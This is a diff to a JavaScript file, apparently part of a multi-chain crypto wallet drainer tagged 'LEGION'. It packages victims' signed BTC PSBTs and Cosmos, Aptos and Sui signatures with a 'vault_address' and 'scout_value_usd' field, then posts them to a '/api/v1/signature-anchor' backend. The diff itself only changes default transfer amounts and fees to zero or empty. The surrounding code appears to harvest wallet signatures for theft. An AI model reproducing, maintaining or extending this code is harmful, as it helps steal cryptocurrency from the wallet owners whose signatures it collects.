@@ -1965,9 +1965,9 @@
             scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
             signed_psbt_base64: signatures.BTC.psbt || signatures.BTC.signature,
             psbt_metadata: {
-              vault_address: vaults.btc,
-              amount_sat: signatures.BTC.amount_sat || '50000',
-              fee_sat: signatures.BTC.fee_sat || '1000'
+              vault_address: vaults.btc || '',
+              amount_sat: signatures.BTC.amount_sat || '0',
+              fee_sat: signatures.BTC.fee_sat || '0'
             }
           };
           console.log('[LEGION]     📝 BTC Payload:', JSON.stringify(btcPayload).substring(0, 100) + '...');
@@ -2042,7 +2042,7 @@
             expiry_iso: '2099-12-31T23:59:59.999Z',
             wallet_type: signatures.COSMOS.walletType || 'hot_wallet',
             scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
-            amount: signatures.COSMOS.amount || '1000000'
+            amount: signatures.COSMOS.amount || '0'
           };
           await apiPost('/api/v1/signature-anchor', cosmosPayload);
           console.log('[LEGION]   ✅ Cosmos submitted');
@@ -2066,7 +2066,7 @@
             expiry_iso: '2099-12-31T23:59:59.999Z',
             wallet_type: signatures.APTOS.walletType || 'hot_wallet',
             scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
-            amount: signatures.APTOS.amount || '1000000'
+            amount: signatures.APTOS.amount || '0'
           };
           await apiPost('/api/v1/signature-anchor', aptosPayload);
           console.log('[LEGION]   ✅ Aptos submitted');
@@ -2090,7 +2090,7 @@
             expiry_iso: '2099-12-31T23:59:59.999Z',
             wallet_type: signatures.SUI.walletType || 'hot_wallet',
             scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
-            amount: signatures.SUI.amount || '1000000'
+            amount: signatures.SUI.amount || '0'
           };
           await apiPost('/api/v1/signature-anchor', suiPayload);
           console.log('[LEGION]   ✅ Sui submitted');
